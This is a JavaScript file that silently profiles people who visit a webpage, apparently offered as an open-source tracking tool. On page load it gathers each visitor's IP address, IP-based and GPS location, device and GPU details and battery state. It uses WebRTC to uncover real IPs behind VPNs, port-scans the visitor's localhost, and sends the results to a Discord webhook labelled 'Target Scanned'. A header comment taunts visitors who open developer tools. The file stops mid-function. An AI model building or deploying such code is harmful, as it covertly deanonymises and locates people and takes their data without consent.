// Congrats on using F12. It's too late but don't worry - we're the good guys.
//
// Follow the Discord link to join us.
// This project is open source and can be found at https://github.com/RocketGod-git/thepiratesplunder 
//
// __________                  __             __     ________             .___ 
// \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
//  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
//  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
//  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
//         \/              \/      \/     \/               \/              \/  


let webhook_url; 

async function main() {
    try {
        webhook_url = "YOUR WEBHOOK GOES HERE"

        var systemDetails = getSystemDetails();

        // Always start with gathering minimal information
        const minimalInfo = await gatherMinimalInformation();
        
        // Send minimal information if the OS or browser is unknown or protected
        if (systemDetails.operatingSystem === "Unknown or Protected OS" || systemDetails.browser === "Unknown or Protected Browser") {
            sendDiscordMessage([{
                "title": "Minimal Browser Access Detected",
                "description": `Access with minimal browser information detected. Details: ${JSON.stringify(minimalInfo)}`,
                "color": 16776960 // Using a different color to highlight minimal access
            }]);
        }

        // Proceed with the full check regardless of the minimal information gathered
        await getLocationAndGPSData();
        setTimeout(showPopup, 3000);
        window.acceptInvite = acceptInvite;

    } catch (error) {
        console.error('Error occurred:', error);
    }
}

            // Extended Operating System Detection
            function detectOperatingSystem(userAgent) {
                if (userAgent.includes("Win")) {
                    if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
                    if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
                    if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
                    if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
                    if (userAgent.includes("Windows NT 6.0")) return "Windows Vista";
                    if (userAgent.includes("Windows NT 5.1")) return "Windows XP";
                    return "Windows (Other)";
                }
                if (userAgent.includes("Mac")) return "MacOS";
                if (userAgent.includes("X11")) return "UNIX";
                if (userAgent.includes("Linux")) return "Linux";
                if (userAgent.includes("Android")) return "Android";
                if (userAgent.includes("like Mac OS X")) {
                    if (userAgent.includes("iPhone")) return "iOS (iPhone)";
                    if (userAgent.includes("iPad")) return "iOS (iPad)";
                    return "iOS (Other)";
                }
                return "Unknown OS";
            }

            
            // Extended Browser Detection
            const userAgentsData = [
                {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3", "pct": 33.41}, {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1", "pct": 15.33}, {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.1", "pct": 14.19}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.", "pct": 9.61}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.", "pct": 7.78}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.", "pct": 5.49}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3", "pct": 2.29}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3", "pct": 2.29}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.4", "pct": 1.83}, {"ua": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck", "pct": 1.37}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.2", "pct": 0.92}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.4", "pct": 0.92}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.", "pct": 0.92}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.5", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.3", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.14", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.3", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.", "pct": 0.46}, {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0 (Edition beta", "pct": 0.46}
            ];

            function detectBrowser(userAgent) {
                // First, try to match against the custom list of user agents
                for (const uaObj of userAgentsData) {
                    // We'll split the user agent string in the data to get the main part for comparison
                    let mainPartOfUA = uaObj.ua.split(' ')[0];
                    if (userAgent.includes(mainPartOfUA)) {
                        // Extract the browser name from the matched user agent
                        // This is a simplified extraction, adjust according to your user agent string format
                        let browserDetails = uaObj.ua.split(' ')[2]; // Assuming 'BrowserName/Version' format
                        let browserName = browserDetails.split('/')[0];
                        return browserName; // Return the extracted browser name
                    }
                }

                // If no match is found in the custom list, proceed with the general detection logic
                if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
                if (userAgent.includes("Seamonkey")) return "Seamonkey";
                if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
                if (userAgent.includes("Chromium")) return "Chromium";
                if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari";
                if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
                if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer";
                if (userAgent.includes("Edge")) return "Edge";
                // Add more conditions as needed for other browsers

                // Default case for unknown or protected browsers
                return "Unknown or Protected Browser";
            }



            const mobileUserAgentsData = [
                {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.3", "pct": 44.09}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.", "pct": 17.2}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.", "pct": 3.23}, {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3", "pct": 3.23}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/290.1.581873948 Mobile/15E148 Safari/604.", "pct": 3.23}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.", "pct": 3.23}, {"ua": "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3", "pct": 2.15}, {"ua": "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.280 Mobile Safari/537.36 OPR/80.3.4244.7759", "pct": 2.15}, {"ua": "Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.3", "pct": 2.15}, {"ua": "Mozilla/5.0 (Linux; Android 12; RBN-NX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.3", "pct": 2.15}, {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.3", "pct": 2.15}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/303.0.605094169 Mobile/15E148 Safari/604.", "pct": 2.15}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/121.0.6167.171 Mobile/15E148 Safari/604.", "pct": 2.15}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.", "pct": 2.15}, {"ua": "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3", "pct": 1.08}, {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.3", "pct": 1.08}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.", "pct": 1.08}, {"ua": "Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.13.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.302 Mobile Safari/537.3", "pct": 1.08}, {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.92 Mobile/15E148 Safari/604.", "pct": 1.08}, {"ua": "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-M236B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3", "pct": 1.08}, {"ua": "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943", "pct": 1.08}, {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.3", "pct": 1.08}
            ];

            function detectMobileBrowser(userAgent) {
                // First, try to match against the custom list of mobile user agents
                for (const uaObj of mobileUserAgentsData) {
                    if (userAgent.includes(uaObj.ua.split(' ')[0])) {
                        // Extract the browser name from the matched user agent
                        let browserDetails = uaObj.ua.match(/(Firefox|Seamonkey|Chrome|Chromium|Safari|OPR|Opera|Edg|MSIE|Trident|CriOS|SamsungBrowser|HuaweiBrowser)[\/\s](\d+)/i);
                        if (browserDetails && browserDetails.length > 1) {
                            return browserDetails[1]; // Returns the extracted browser name
                        }
                    }
                }

                // If no match is found in the custom list, proceed with general mobile detection logic
                if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
                if (userAgent.includes("Seamonkey")) return "Seamonkey";
                if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
                if (userAgent.includes("CriOS")) return "Chrome for iOS"; // Chrome on iOS
                if (userAgent.includes("Chromium")) return "Chromium";
                if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium") && !userAgent.includes("CriOS")) return "Safari";
                if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
                if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
                if (userAgent.includes("HuaweiBrowser")) return "Huawei Browser";
                // Add more conditions as needed for other mobile browsers

                // Default case for unknown or protected browsers
                return "Unknown or Protected Browser";
            }


            function extractDeviceModel(userAgent) {
                let deviceInfo = "Unknown Device";
            
                // Android Devices
                const androidMatch = userAgent.match(/\bAndroid\b.*?;\s([^)]+)\)/);
                if (androidMatch && androidMatch.length > 1) {
                    deviceInfo = androidMatch[1].trim(); // Extracts the device model for Android
                }
            
                // iPhones (iOS version can be indicative of the device range)
                const iPhoneMatch = userAgent.match(/\bCPU iPhone OS ([\d_]+) like Mac OS X\b/);
                if (iPhoneMatch && iPhoneMatch.length > 1) {
                    const iOSVersion = iPhoneMatch[1].replace(/_/g, '.');
                    deviceInfo = `iPhone (iOS ${iOSVersion})`; // Not the exact model, but gives an idea about the device range
                }
            
                return deviceInfo;
            }
            

            // Function to get operating system and browser details
            function getSystemDetails() {
                var userAgent = navigator.userAgent;
                var operatingSystem = detectOperatingSystem(userAgent);
                var browser;
            
                // Check if the device is mobile and use detectMobileBrowser if true
                if (/Mobile|Tablet|Android|iPhone|iPad/i.test(userAgent)) {
                    browser = detectMobileBrowser(userAgent);
                } else {
                    browser = detectBrowser(userAgent);
                }
            
                return {
                    operatingSystem,
                    browser
                };
            }
            

            async function getDeviceDetails() {
                let details = {
                    architecture: 'NA',
                    model: 'NA',
                    platform: 'NA',
                    platformVersion: 'NA',
                };
            
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    try {
                        const highEntropyValues = await navigator.userAgentData.getHighEntropyValues([
                            'architecture',
                            'model',
                            'platform',
                            'platformVersion',
                            'fullVersionList',
                        ]);
                        details = { ...details, ...highEntropyValues };
                    } catch (error) {
                        console.error('Error fetching high entropy values:', error);
                    }
                }
            
                return details;
            }
            
            async function enhancedDataCollection() {
                const deviceDetails = await getDeviceDetails();
            }
            

        // Enhanced Data Collection
        async function gatherMinimalInformation() {
            const minimalInfo = {
                ip: "Unknown", // Default value in case of failure
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
                language: navigator.language || "Unknown Language",
                deviceType: /Mobile|Tablet|Android|iPhone|iPad/.test(navigator.userAgent) ? "Mobile" : "Desktop",
                browser: (function() {
                    var userAgent = navigator.userAgent;
                    var browserMatch = userAgent.match(/(firefox|msie|chrome|safari|trident|opera|edge)[\/\s](\d+)/i) || [];
                    return browserMatch[1] ? `${browserMatch[1]} ${browserMatch[2]}` : "Unknown Browser";
                })(),
                platform: navigator.platform || "Unknown Platform",
                cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",
                doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
                currentTime: new Date().getTime(),
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                connectionType: navigator.connection && navigator.connection.type ? navigator.connection.type : "Unknown",
                batteryLevel: "Unknown", 
                isCharging: "Unknown" 
            };
        
            // IP Address fetching with error handling
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const { ip } = await ipResponse.json();
                    minimalInfo.ip = ip;
                } else {
                    console.warn('IP fetch response was not OK, using default IP value.');
                }
            } catch (error) {
                console.error('Failed to fetch IP address, using default IP value:', error);
            }
        
            // Battery Status fetching with error handling
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    minimalInfo.batteryLevel = `${battery.level * 100}%`;
                    minimalInfo.isCharging = battery.charging ? "Charging" : "Not Charging";
                } catch (error) {
                    console.error('Failed to fetch battery status, using default battery values:', error);
                }
            }
        
            return minimalInfo;
        }
        
            
            // Function to get GPU details            
            function getGPUDetails() {
                return new Promise((resolve) => {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) {
                        resolve({ vendor: "Not Available", renderer: "Not Available" });
                        return;
                    }
                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        resolve({ vendor, renderer });
                    } else {
                        resolve({ vendor: "Not Available", renderer: "Not Available" }); // Fallback when extension is not available
                    }
                });
            }
            

            // Function for port scanning with WebSocket
            function checkPort(port) {
                return new Promise((resolve) => {
                    let ws;
                    const url = 'ws://localhost:' + port;
                    const timeout = setTimeout(() => {
                        if (ws) {
                            ws.close();
                        }
                        resolve({ port, isOpen: false }); // Port is closed or blocked
                    }, 2000); // Timeout in 2 seconds

                    try {
                        ws = new WebSocket(url);
                        ws.onopen = () => {
                            clearTimeout(timeout);
                            ws.close();
                            resolve({ port, isOpen: true }); // Port is open
                        };
                        ws.onerror = () => {
                            clearTimeout(timeout);
                            resolve({ port, isOpen: false }); // Port is closed or blocked
                        };
                    } catch (e) {
                        clearTimeout(timeout);
                        resolve({ port, isOpen: false }); // Handle any exception
                    }
                });
            }


            // Function to send the second webhook if GPS location is shared
            function sendLocationWebhook(ip, gpsText) {
                var embed = {
                    "title": "User Allowed Location Sharing",
                    "description": `IP Address: ${ip}\nGPS Location: ${gpsText}`,
                    "color": 65280 
                };

                // Notice that 'embed' is wrapped in an array
                sendDiscordMessage(webhook_url, [embed]);
            }


            //Main function for processing
            async function getLocationAndGPSData() {
                var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
                var messageSent = false; 
                var portsToCheck = [53, 80, 443, 995, 8080, 8081, 2222, 5001, 50000, 8443, 2086, 5555, 25565, 554, 1935, 21, 22, 23, 25, 110, 143, 3306, 3389, 5900, 55443, 10001];
            
                try {
                    const portResults = await Promise.allSettled(portsToCheck.map(port => checkPort(port)));
                    const openPorts = portResults.filter(result => result.status === 'fulfilled' && result.value.isOpen).map(result => result.value.port);
                    console.log('Open ports:', openPorts);
            
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (!ipResponse.ok) {
                        throw new Error('Network response was not ok for IPify.');
                    }
                    const { ip } = await ipResponse.json();
            
                    const ipapiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    if (!ipapiResponse.ok) {
                        throw new Error('Network response was not ok for IPAPI.');
                    }
                    const location = await ipapiResponse.json();
            
                    // Fetch minimal information here
                    const minimalInfo = await gatherMinimalInformation();
            
                    const [vpnResult, webrtcResult, gpuDetails] = await Promise.all([
                        checkVPN(ip, userTimezone),
                        checkWebRTCLoak(),
                        getGPUDetails()
                    ]);
            
                    var systemDetails = getSystemDetails();
                    var screenResolution = `${window.screen.width}x${window.screen.height}`;
                    var referrer = document.referrer || "No referrer";
                    var language = navigator.language;
                    var additionalDetails = getAdditionalDetails();
                    var locationValue = getLocationValue(location);
                    var gpsValue = location && location.latitude && location.longitude ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : "Location data not available";
                    var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
                    var deviceDetails = await getDeviceDetails();
                    var deviceModel = "Unknown Device"; 
                    if (/Mobile|Tablet|Android|iPhone|iPad/i.test(navigator.userAgent)) {
                        deviceModel = extractDeviceModel(navigator.userAgent);
                        
                    }
                                            
                   
                    await sendDiscordEmbed(webhook_url, location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult, userTimezone, gpuValue, openPorts, additionalDetails, minimalInfo, deviceModel, deviceDetails);
                    messageSent = true; 
            
                    // Additional data send on geolocation permission
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function (position) {
                                var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                                var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
            
                                // Call the function to send the new webhook
                                sendLocationWebhook(ip, gpsText);
                            },
                            function (error) {
                                console.error('Geolocation error:', error);
                            },
                            { timeout: 10000 }
                        );
                    }
                } catch (error) {
                    console.error('Error in getLocationAndGPSData:', error);
                }
            }
            
            function getLocationValue(location) {
                if (location.region == null) {
                    return location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
                } else if (location.city == location.country_name) {
                    return location && location.city ? `${location.city}` : "Location data not available";
                } else {
                    return location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
                }
            }
            
            function checkVPN(ip, timezone) {
                return new Promise((resolve, reject) => {
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(data => {
                            if (data.error) {
                                console.error('Error with VPN check:', data.error);
                                resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + data.error });
                                return;
                            }
    
                            const ipTimezone = data.timezone;
                            const timezoneMatch = timezone === ipTimezone;
                            const vpnMessage = timezoneMatch
                                ? 'Timezones match'
                                : 'Timezones do not match (VPN?)';
                            resolve({ isVpn: !timezoneMatch, vpnMessage });
                        })
                        .catch(error => {
                            console.error('Error in VPN check:', error.message);
                            resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + error.message });
                        });
                });
            }
    
            //Sneak real IP with WebRTC
            function checkWebRTCLoak() {
                return new Promise(resolve => {
                    const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!rtcPeerConnection) {
                        resolve({ hasLeak: false, leakMessage: "WebRTC not supported" });
                        return;
                    }
    
                    const pc = new rtcPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(error => {
                            console.error("WebRTC Offer Error:", error);
                            resolve({ hasLeak: false, leakMessage: "Error in WebRTC offer: " + error.message });
                        });
    
                    pc.onicecandidate = ice => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            pc.close();
                            return;
                        }
    
                        const regexResult = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (regexResult && regexResult[1]) {
                            const myIP = regexResult[1];
                            pc.close();
                            resolve({ hasLeak: true, leakMessage: "Real IP Detected: " + myIP });
                        } else {
                            resolve({ hasLeak: false, leakMessage: "No Leak Detected" });
                        }
                    };
    
    
                }).catch(error => {
                    console.error("Error in checkWebRTCLoak:", error);
                    return { hasLeak: false, leakMessage: "An error occurred in checkWebRTCLoak: " + error.message };
                });
            }
    
            //Error Handler
            function handleErrorType(errorCode, errorMessage, userTimezone) {
                let errorDescription;
    
                // Handling standard geolocation error codes
                switch (errorCode) {
                    case 1:
                        // Special handling for Permission Denied
                        sendDiscordEmbed(null, "Geolocation permission denied", null, null, null, null, null, null, null, userTimezone);
                        return;
                    case 2:
                        errorDescription = "Location information is unavailable.";
                        break;
                    case 3:
                        errorDescription = "The request to get user location timed out.";
                        break;
                    default:
                        // Handling custom 'unknown' error code
                        if (errorCode === 'unknown') {
                            errorDescription = "An unknown error occurred.";
                        } else {
                            errorDescription = "An error occurred. Error Code: " + errorCode;
                        }
                        break;
                }
    
                console.error(errorMessage || errorDescription);
    
                // Send error embed for cases other than Permission Denied
                if (errorCode !== 1) {
                    const errorEmbed = {
                        "title": "Error",
                        "color": 16711680, // Red color for error
                        "description": errorMessage || errorDescription
                    };
    
                    sendDiscordMessage([errorEmbed]);
                }
            }


            function getAdditionalDetails(batteryLevel, isCharging) {
                var userAgent = navigator.userAgent;
            
                // Detecting Device Type
                var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
            
                // Extracting Browser Version
                var browserMatch = userAgent.match(/(firefox|msie|chrome|safari|trident|opera|edge)[\/\s](\d+)/i);
                var browserVersion = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : 'Unknown';
            
                // Determining Connection Type
                var connectionDetails = 'Unknown';
                if (navigator.connection) {
                    var connectionType = navigator.connection.type || 'Unknown type';
                    var downlink = navigator.connection.downlink ? `Downlink: ${navigator.connection.downlink}Mbps` : '';
                    var effectiveType = navigator.connection.effectiveType ? `Effective Type: ${navigator.connection.effectiveType}` : '';
                    var rtt = navigator.connection.rtt ? `RTT: ${navigator.connection.rtt}ms` : '';
                    connectionDetails = [connectionType, downlink, effectiveType, rtt].filter(detail => detail).join(', ');
                }
            
                // Interpreting Do Not Track Setting
                var doNotTrack = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
                doNotTrack = doNotTrack === '1' || doNotTrack === 'yes' ? 'On' : (doNotTrack === '0' || doNotTrack === 'no' ? 'Off' : 'Unknown');
            
                // Logging for Debugging
                console.log("User Agent:", userAgent);
                console.log("Device Type:", deviceType);
                console.log("Browser Version:", browserVersion);
                console.log("Connection Type:", connectionDetails);
                console.log("Do Not Track Value:", doNotTrack);
                console.log("Battery Level:", batteryLevel || "Unknown");
                console.log("Is Charging:", isCharging || "Unknown");
            
                return {
                    deviceType,
                    browserVersion,
                    connectionDetails,
                    doNotTrack,
                    batteryLevel: batteryLevel || "Unknown", 
                    isCharging: isCharging || "Unknown" 
                };
            }
            
            // Function to send message to Discord
            function sendDiscordEmbed(webhook_url, location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue, openPorts, additionalDetails, minimalInfo, deviceModel, deviceDetails) {
                let leakMessage = webrtcResult && webrtcResult.hasLeak ? webrtcResult.leakMessage : "No Leak Detected";
                var portStatusString = openPorts.length > 0 ? openPorts.map(port => `Port ${port}`).join(', ') : "No open ports detected";

                let vpnDetectionResult = "Unknown";
                if (isVpn) {
                    vpnDetectionResult = "🛡️ VPN Detected (Timezone Mismatch)";
                    if (webrtcResult.hasLeak) {
                        const realIp = webrtcResult.leakMessage.replace("Real IP Detected: ", "");
                        leakMessage = `Real IP Detected: ${realIp}`;
                        vpnDetectionResult += " & WebRTC Leak";
                    }
                } else if (webrtcResult.hasLeak) {
                    const realIp = webrtcResult.leakMessage.replace("Real IP Detected: ", "");
                    leakMessage = `Real IP Detected: ${realIp}`;
                    vpnDetectionResult = "🛡️ Possible VPN/WebRTC Leak Detected";
                } else {
                    vpnDetectionResult = "No VPN Detected";
                }

                var embeds = [{
                    "title": "🎯 Target Scanned",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "🌍 **User & Location Details**",
                            "value": `IP Address: [${location.ip ? location.ip : "Unknown"}](http://${location.ip})\n` +
                                     `IP Address Location: ${gpsValue ? gpsValue : "Unknown"}\n` +
                                     `Time Zone: ${userTimezone ? userTimezone : "Unknown"}\n` +
                                     `Time Zone vs IP Location: ${vpnMessage ? vpnMessage : "Unknown"}`,
                            "inline": false
                        },
                        {
                            "name": "💻 **Device & System Specifications**",
                            "value": `Device Type: ${additionalDetails.deviceType ? additionalDetails.deviceType : "Unknown"}\n` +
                                     `Operating System: ${systemDetails.operatingSystem ? systemDetails.operatingSystem : "Unknown"}\n` +
                                     `Browser & Version: ${systemDetails.browser ? systemDetails.browser : 'Unknown'} ${additionalDetails.browserVersion ? additionalDetails.browserVersion : 'Unknown'}\n` +
                                     `GPU: ${gpuValue ? gpuValue : "Unknown"}\n` +
                                     `Screen Resolution: ${screenResolution ? screenResolution : "Unknown"}\n` +
                                     `Platform: ${minimalInfo.platform}\n` +
                                     `Hardware Concurrency: ${minimalInfo.hardwareConcurrency}`,
                            "inline": false
                        },
                        {
                            "name": "📱 **Mobile Device Data**",
                            "value": `Model from header: ${deviceModel}\n` +
                            `Model if Google: ${deviceDetails.model}\nArchitecture: ${deviceDetails.architecture}\nPlatform: ${deviceDetails.platform} ${deviceDetails.platformVersion}`,   
                            "inline": false
                        },                        
                        {
                            "name": "🔒 **Security and Privacy**",
                            "value": `VPN Detection: ${vpnDetectionResult}\n` +
                                     `WebRTC Leak Status: ${leakMessage}\n` +
                                     `Port Status: ${portStatusString}\n` +
                                     `Do Not Track: ${additionalDetails.doNotTrack}\n` +
                                     `Cookies Enabled: ${minimalInfo.cookiesEnabled}`,
                            "inline": false
                        },        
                        {
                            "name": "🔎 **Additional Details**",
                            "value": `Referrer: ${referrer ? referrer : "Unknown"}\n` +
                                     `Language: ${language ? language : "Unknown"}\n` +
                                     `Connection Type: ${minimalInfo.connectionType}\n` +
                                     `Connection Details: ${additionalDetails.connectionDetails ? additionalDetails.connectionDetails : "Unknown"}\n` +
                                     `Battery Level: ${additionalDetails.batteryLevel}\n` +
